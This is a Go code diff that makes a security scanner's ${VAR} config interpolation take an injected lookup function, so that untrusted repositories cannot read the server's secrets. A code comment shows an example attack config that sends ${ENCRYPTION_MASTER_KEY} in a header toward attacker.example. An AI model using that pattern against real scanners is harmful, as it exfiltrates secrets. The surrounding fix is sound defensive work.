@@ -28,7 +28,42 @@ var envReference = regexp.MustCompile(`\$\{([A-Za-z_][A-Za-z0-9_]*)(:-([^}]*))?\
 // express its own syntax is a config with a trap in it.
 const escapedDollar = "$${"
 
-// interpolate replaces ${VAR} references with the environment's values.
+// Lookup resolves a variable reference. It is a parameter rather than a call to
+// os.LookupEnv because whose environment answers is the whole security question.
+//
+// For `dragon scan` the answer is the process environment: the person running
+// it wrote the config and owns the secrets, and reading their own shell is the
+// point of the feature.
+//
+// For a server evaluating a configuration file out of a repository it did not
+// write, the process environment is the worst possible answer. A scanner that
+// resolves ${VAR} against its own environment hands any repository it can
+// clone a read primitive over every secret the scanner holds -- and DAST
+// config is an egress primitive in the same file, so the two compose into
+// exfiltration with no exploit needed:
+//
+//	dast:
+//	  headers:
+//	    X-Data: "${ENCRYPTION_MASTER_KEY}"
+//	engines:
+//	  zap:
+//	    rules: ["https://attacker.example/"]
+//
+// So the source is supplied by whoever is trusted to decide it, and a caller
+// handling untrusted input supplies one that holds only what that input is
+// entitled to see.
+type Lookup func(name string) (string, bool)
+
+// OSEnv resolves against the process environment. Correct for a CLI, wrong for
+// a server reading somebody else's repository.
+func OSEnv(name string) (string, bool) { return os.LookupEnv(name) }
+
+// NoEnv resolves nothing. Every reference in the document is then reported as
+// unset, which is the safe direction: a configuration that wanted a variable it
+// may not have fails loudly instead of quietly being given one.
+func NoEnv(string) (string, bool) { return "", false }
+
+// interpolate replaces ${VAR} references using the supplied lookup.
 //
 // An unset variable with no default is an error, not an empty string. Empty
 // would produce `Authorization: Bearer ` -- a header that is present, wrong,
@@ -38,7 +73,10 @@ const escapedDollar = "$${"
 //
 // A project that genuinely wants an optional value says so with ${VAR:-} and
 // means it.
-func interpolate(raw []byte) ([]byte, error) {
+func interpolate(raw []byte, lookup Lookup) ([]byte, error) {
+	if lookup == nil {
+		lookup = NoEnv
+	}
 	const placeholder = "\x00dragonguard-literal-dollar-brace\x00"
 	text := strings.ReplaceAll(string(raw), escapedDollar, placeholder)
 
@@ -47,7 +85,7 @@ func interpolate(raw []byte) ([]byte, error) {
 		m := envReference.FindStringSubmatch(ref)
 		name, hasDefault, fallback := m[1], m[2] != "", m[3]
 
-		if v, ok := os.LookupEnv(name); ok && v != "" {
+		if v, ok := lookup(name); ok && v != "" {
 			return v
 		}
 		if hasDefault {
